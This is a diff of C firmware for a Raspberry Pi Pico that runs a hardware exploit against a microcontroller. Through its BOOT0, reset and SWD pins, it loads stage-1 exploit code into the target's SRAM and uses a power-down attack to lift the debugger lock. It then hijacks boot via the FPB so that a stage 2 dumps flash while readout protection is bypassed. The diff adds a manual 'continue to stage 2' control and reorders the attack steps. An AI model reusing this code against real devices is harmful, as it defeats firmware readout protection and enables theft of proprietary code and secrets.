@@ -67,11 +67,11 @@ static void target_power(bool on)
 	}
 }
 
-static void handle_control(uint32_t timeout_ms)
+static int handle_control(uint32_t timeout_ms)
 {
 	int c = getchar_timeout_us(timeout_ms * 1000);
-	if (c == PICO_ERROR_TIMEOUT) {
-		return;
+	if ((c == PICO_ERROR_TIMEOUT) || (c == '\0')) {
+		return 0;
 	}
 	switch (c) {
 	case 'b':
@@ -79,18 +79,27 @@ static void handle_control(uint32_t timeout_ms)
 		reset_usb_boot(0, 0);
 		sleep_ms(10000);
 		break;
+
 	case 'r':
 		printf("Restarting Pico\n");
 		watchdog_reboot(0, 0, 10);
 		sleep_ms(10000);
 		break;
+
+	case 'c':
+		printf("Continuing explot\n");
+		break;
+
 	default:
+		printf("Unrecognized key '%c' (0x%02x)", c, c);
 		printf("Usage:\n");
 		printf("    b    Reboot into bootloader mode\n");
 		printf("    r    Restart Pico\n");
+		printf("    c    Continue to stage 2\n");
 		printf("\n");
 		break;
 	}
+	return c;
 }
 
 static void validate_reset(void)
@@ -121,18 +130,12 @@ __attribute__((section(".data"))) static uint32_t powerdown_attack(void)
 	return count;
 }
 
-// static char payload_swapped[sizeof(payload) + 4];
-
 int main()
 {
 	stdio_init_all();
-	// while (!tud_cdc_connected()) {
-	// }
 
-	// // Byteswap the payload
-	// for (int i = 0; i < sizeof(payload) / 4; i += 1) {
-	// 	payload_swapped[i] = __builtin_bswap32(payload[i]);
-	// }
+	// Delay enough time for the serial port to re-attach
+	sleep_ms(1000);
 
 	// Init GPIOs
 	gpio_init(LED_PIN);
@@ -160,21 +163,25 @@ int main()
 
 	// -- Attack begins here --
 
-	// Set BOOT0 to high and enable power
-	gpio_put(BOOT0_PIN, 1);
+	// Set BOOT0 to high and enable power. This will execute from SRAM, but since
+	// there is no data there yet it will execute garbage and likely crash. Our
+	// software will recover it.
+	gpio_put(BOOT0_PIN, true);
 
-	/* Enable power
-	 * Ensure that the power pin set high before configuring it as output
-	 * to prevent the target from sinking current through the pin if the debug
-	 * probe is already attached
-	 */
-	target_power(true);
+	// Enable power
+	// Ensure that the power pin set high before configuring it as output
+	// to prevent the target from sinking current through the pin if the debug
+	// probe is already attached
+	target_power(false);
 	gpio_set_dir(POWER1_PIN, GPIO_OUT);
 	gpio_set_dir(POWER2_PIN, GPIO_OUT);
 	gpio_set_dir(POWER3_PIN, GPIO_OUT);
+	sleep_ms(100);
+	target_power(true);
 
 	gpio_put(LED_PIN, 0);
 
+	// Validate that the target is no longer in reset.
 	validate_reset();
 
 	// Load the exploit firmware onto the target
@@ -183,50 +190,133 @@ int main()
 		handle_control(500);
 	}
 
-	printf("Connected to target. Firmware is now loaded into SRAM.\n");
-	sleep_ms(1000);
+	printf("Connected to target. Firmware is now loaded into SRAM. Device is in reset.\n");
+	sleep_ms(100);
+#if 1
+	// Set SWCLK and SWDIO pins to inputs since we'll be using them
+	// to exfiltrate data. Additionally, we don't want to power the
+	// target via phantom current on the SWD pins.
+	gpio_set_dir(SWCLK_PIN, GPIO_IN);
+	gpio_set_dir(SWDIO_PIN, GPIO_IN);
 
-	validate_reset();
+	// Set BOOT0 to high to ensure the SRAM payload is executed
+	gpio_put(BOOT0_PIN, 1);
 
-	printf("Starting attack...\n");
+	// Deassert reset. This will boot into Stage 1 when power is reapplied.
+	gpio_set_dir(RESET_PIN, GPIO_IN);
 
-	// // Set SWCLK and SWDIO pins to inputs since we'll be using them
-	// // to exfiltrate data. Additionally, we don't want to power the
-	// // target via phantom current on the SWD pins.
-	// gpio_set_dir(SWCLK_PIN, GPIO_IN);
-	// gpio_set_dir(SWDIO_PIN, GPIO_IN);
+	uint32_t count;
+	
+	count = powerdown_attack();
+	printf("Target powered off after %d ticks\n", count);
 
-	// gpio_set_dir(RESET_PIN, GPIO_OUT);
-	// sleep_ms(10);
-	// gpio_set_dir(RESET_PIN, GPIO_IN);
+	sleep_ms(10);
+
+	// Set SWCLK and SWDIO to outputs and drive them high. This
+	// will be the basis of bidirectional communication.
+	gpio_set_dir(SWCLK_PIN, GPIO_OUT);
+	gpio_set_dir(SWDIO_PIN, GPIO_OUT);
+	gpio_put(SWCLK_PIN, true);
+	gpio_put(SWDIO_PIN, true);
+
+	printf("Press 'c' to continue into stage 2\n");
+	while (handle_control(500) != 'c') {}
+	printf("Resetting target into stage 2\n");
+
+	// Reset the board again with BOOT0 held low. This will cause it
+	// to boot into stage 2.
+	gpio_put(BOOT0_PIN, 0);
+	gpio_set_dir(RESET_PIN, GPIO_OUT);
+	sleep_ms(10);
+	gpio_set_dir(RESET_PIN, GPIO_IN);
+#endif
+#if 0
+	// Set SWCLK and SWDIO pins to inputs since we'll be using them
+	// to exfiltrate data. Additionally, we don't want to power the
+	// target via phantom current on the SWD pins.
+	gpio_set_dir(SWCLK_PIN, GPIO_IN);
+	gpio_set_dir(SWDIO_PIN, GPIO_IN);
+
+	gpio_set_dir(RESET_PIN, GPIO_OUT);
+	sleep_ms(10);
+	gpio_set_dir(RESET_PIN, GPIO_IN);
 
 	uint32_t count = powerdown_attack();
 
 	printf("Target powered off after %d ticks\n", count);
 
-	// Payload verification
-	{
-		bmp_loader(payload, sizeof(payload), 0x20000000, true);
-		gpio_set_dir(SWCLK_PIN, GPIO_IN);
-		gpio_set_dir(SWDIO_PIN, GPIO_IN);
-	}
+	// // Payload verification
+	// {
+	// 	bmp_loader(payload, sizeof(payload), 0x20000000, true);
+	// 	gpio_set_dir(SWCLK_PIN, GPIO_IN);
+	// 	gpio_set_dir(SWDIO_PIN, GPIO_IN);
+	// }
 
-	// // Debugger lock is now disabled and we're now
-	// // booting from SRAM. Wait for the target to run stage 1
-	// // of the exploit which sets the FPB to jump to stage 2
-	// // when the PC reaches a reset vector fetch (0x00000004)
-	// sleep_ms(15);
+	// Debugger lock is now disabled and we're now
+	// booting from SRAM. Wait for the target to run stage 1
+	// of the exploit which sets the FPB to jump to stage 2
+	// when the PC reaches a reset vector fetch (0x00000004)
+	sleep_ms(15);
 
-	// // Set BOOT0 to boot from flash. This will trick the target
-	// // into thinking it's running from flash, which will
-	// // disable readout protection.
-	// gpio_put(BOOT0_PIN, 0);
+	// Set BOOT0 to boot from flash. This will trick the target
+	// into thinking it's running from flash, which will
+	// disable readout protection.
+	gpio_put(BOOT0_PIN, 0);
+
+	// Reset the target
+	gpio_set_dir(RESET_PIN, GPIO_OUT);
+	gpio_put(RESET_PIN, 0);
+
+	// Wait for reset
+	sleep_ms(15);
+
+	// Release reset
+	// Due to the FPB, the target will now jump to
+	// stage 2 of the exploit and dump the contents
+	// of the flash over UART
+	gpio_set_dir(RESET_PIN, GPIO_IN);
+	gpio_pull_up(RESET_PIN);
+#endif
+#if 0
+	gpio_put(BOOT0_PIN, 1);
+
+	// Set SWCLK and SWDIO pins to inputs since we'll be using them
+	// to exfiltrate data. Additionally, we don't want to power the
+	// target via phantom current on the SWD pins.
+	gpio_set_dir(SWCLK_PIN, GPIO_IN);
+	gpio_set_dir(SWDIO_PIN, GPIO_IN);
+
+	uint32_t count;
+	
+	count = powerdown_attack();
+	printf("Target powered off after %d ticks\n", count);
+
+	// // Payload verification
+	// {
+	// 	bmp_loader(payload, sizeof(payload), 0x20000000, true);
+	// 	gpio_set_dir(SWCLK_PIN, GPIO_IN);
+	// 	gpio_set_dir(SWDIO_PIN, GPIO_IN);
+	// }
+
+	// Debugger lock is now disabled and we're now
+	// booting from SRAM. Wait for the target to run stage 1
+	// of the exploit which sets the FPB to jump to stage 2
+	// when the PC reaches a reset vector fetch (0x00000004)
+	sleep_ms(15);
+
+	// Set BOOT0 to boot from flash. This will trick the target
+	// into thinking it's running from flash, which will
+	// disable readout protection.
+	gpio_put(BOOT0_PIN, 0);
+
+	count = powerdown_attack();
+	printf("Target powered off after %d ticks\n", count);
 
 	// // Reset the target
 	// gpio_set_dir(RESET_PIN, GPIO_OUT);
 	// gpio_put(RESET_PIN, 0);
 
-	// // Wait for reset
+	// Wait for reset
 	// sleep_ms(15);
 
 	// // Release reset
@@ -235,6 +325,7 @@ int main()
 	// // of the flash over UART
 	// gpio_set_dir(RESET_PIN, GPIO_IN);
 	// gpio_pull_up(RESET_PIN);
+#endif
 
 	printf("Reading data from target...\n");
 
